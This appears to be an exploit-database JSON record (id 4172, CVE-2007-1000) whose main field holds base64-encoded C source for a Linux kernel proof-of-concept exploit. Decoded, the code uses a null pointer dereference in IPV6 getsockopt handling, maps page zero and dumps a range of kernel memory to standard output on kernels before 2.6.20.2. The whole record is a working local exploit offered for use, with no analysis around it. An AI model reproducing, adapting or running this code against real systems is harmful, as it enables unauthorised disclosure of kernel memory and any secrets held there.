{
    "source": "exploit-database", 
    "exploit": "LyoNCiAqIExpbnV4IEtlcm5lbCBJUFY2X0dldHNvY2tvcHRfU3RpY2t5IE1lbW9yeSBMZWFrICBQcm9vZiBPZiBDb25jZXB0DQogKiBkcmV5ZXIgMDctMjAwNw0KICogT3N1LCBUYXRha2FlLCBTZXh5IFBhbmRhcyENCiAqDQogKiAgRHVtcHMgdG8gc3Rkb3V0IHRoZSBtZW1vcnkgbWFwcGVkIGJldHdlZW4gSU5JIGFuZCBFTkQuDQogKg0KICogQ1ZFOiBDVkUtMjAwNy0xMDAwICBCSUQ6IDIyOTA0DQogKg0KICogIEFmZmVjdGVkOiBMaW51eCBLZXJuZWwgPCAyLjYuMjAuMg0KICoNCiAqIGh0dHA6Ly9idWd6aWxsYS5rZXJuZWwub3JnL3Nob3dfYnVnLmNnaT9pZD04MTM0DQogKg0KICogRXhwbG9pdGF0aW9uIGJhc2VkIG9uIG51bGwgcG9pbnRlciBkZXJlZmVyZW5jZTogaHR0cDovL2xpc3RzLmltbXVuaXR5c2VjLmNvbS9waXBlcm1haWwvZGFpbHlkYXZlLzIwMDctTWFyY2gvMDA0MTMzLmh0bWwNCiAqDQogKiBGb3IgZnJlZSEhISAoIHdvcnRoIDYwMCBFVVIgaW4gemVyb2JheSEgKQ0KICoNCiAqLw0KDQoNCiNpbmNsdWRlIDxzeXMvbW1hbi5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxzdHJpbmcuaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCiNpbmNsdWRlIDxzdGRpby5oPg0KDQojZGVmaW5lIEhPUE9QVF9PRkZTRVQgOA0KI2RlZmluZSBJTklBRERSIDB4YzAxMDAwMDANCiNkZWZpbmUgRU5EQUREUiAgMHhkMDAwMDAwMA0KdW5zaWduZWQgaW50IGk7DQoNCg0KaW50IG1haW4oaW50IGFyZ2MsIGNoYXIgKmFyZ3ZbXSkgew0KICBpbnQgczsNCiAgdW5zaWduZWQgaW50IG9wdGxlbjsNCiAgdm9pZCAqcHRyOw0KICBjaGFyIHZhbHVlWzEwMjQwXTsNCiAgY2hhciB0ZXh0WzEyXTsNCg0KICBmcHJpbnRmKHN0ZGVyciwiSXB2Nl9nZXRzb2Nrb3B0X3N0aWNreSB2dWxuIFBPQ1xuIg0KICAgICAgICAgICAgICAgICAiZHJleWVyICcwNyAtIGZyZWUgZmVlbHMgYmV0dGVyXG4iDQogICAgICAgICAgICAgICAgICJEdW1waW5nICVwIC0gJXAgdG8gc3Rkb3V0XG4iLElOSUFERFIsRU5EQUREUik7DQoNCiAgcyA9IHNvY2tldChBRl9JTkVUNiwgU09DS19TVFJFQU0sIElQUFJPVE9fVENQKTsNCiAgDQogIC8qIE1ha2UgbnAtPm9wdCA9IE5VTEwgPSAweDAwMDAwMDAwICB0aHJvdWdoIElQVjZfMjI5MlBLVE9QVElPTlMgKi8NCiAgc2V0c29ja29wdChzLCBJUFBST1RPX0lQVjYsIElQVjZfMjI5MlBLVE9QVElPTlMsICh2b2lkICopTlVMTCwgMCk7DQoNCiAgLyogTWFrZSAweDAwMDAwMDAwIGFkZHJlc3MgdmFsaWQgKi8NCiAgcHRyID0gbW1hcChOVUxMLCA0MDk2LCBQUk9UX1JFQUQgfCBQUk9UX1dSSVRFLCBNQVBfRklYRUQgfCBNQVBfQU5PTllNT1VTIHwgTUFQX1BSSVZBVEUsIDAsIDApOw0KDQogIGlmIChwdHIgIT0gTlVMTCkgew0KICAgICAgcGVycm9yKCJtbWFwIik7DQogICAgICBleGl0KC0xKTsNCiAgfQ0KDQogIG1lbXNldChwdHIsMCw0MDk2KTsNCg0KICAvKiBNYWtlIHB0ciBwb2ludCB0byBucC0+b3B0LT5ob3BvcHQgPSAgKDB4MDAwMDAwMDApLT5ob3BvcHQgPSANCiAgICogMHgwMDAwMDAwMCArIDggKi8NCiAgcHRyPShjaGFyICopKChjaGFyICopcHRyK0hPUE9QVF9PRkZTRVQpOw0KDQogIGk9SU5JQUREUjsNCiAgd2hpbGUoaTxFTkRBRERSKSB7DQogICAgICAvKiBQdXQgaW4gaG9wb3B0IHRoZSBhZGRyZXNzIHdlIHdhbnQgdG8gcmVhZCAqLw0KICAgICAgKigoaW50ICopcHRyKT1pOw0KICAgICAgb3B0bGVuPTEwMjQwOw0KICAgICAgLyogR2V0IHRoZSBjaHVuayBwb2ludGVkIGJ5IGhvcG9wdCB0aHJvdWdoIGdldHNvY2tvcHQgSVBWNl9EU1RPUFRTICovDQogICAgICBnZXRzb2Nrb3B0KHMsIElQUFJPVE9fSVBWNiwgSVBWNl9EU1RPUFRTLCAodm9pZCAqKXZhbHVlLCAmb3B0bGVuKTsNCiAgICAgIGlmKG9wdGxlbj4wKSB7DQogICAgICAgICAgc3ByaW50Zih0ZXh0LCJcbiUwOHg6IixpKTsNCiAgICAgICAgICB3cml0ZSgxLHRleHQsc3RybGVuKHRleHQpKTsNCiAgICAgICAgICB3cml0ZSgxLHZhbHVlLG9wdGxlbik7DQogICAgICAgICAgaT1pK29wdGxlbjsNCiAgICAgIH0gZWxzZSB7DQogICAgICAgICAgLyogV2UgY291bGQgbm90IHJlYWQgdGhpcyBwb3J0aW9uIGJlY2F1c2Ugb2Ygc29tZSBlcnJvciwgc2tpcCBpdCAqLw0KICAgICAgICAgIGk9aSs0Ow0KICAgICAgfQ0KICB9DQoNCiAgcmV0dXJuIDA7DQp9DQoNCi8vIG1pbHcwcm0uY29tIFsyMDA3LTA3LTEwXQ==", 
    "filename": "platforms/linux/local/4172.c", 
    "id": "4172", 
    "cves": [
        "CVE-2007-1000"
    ]
}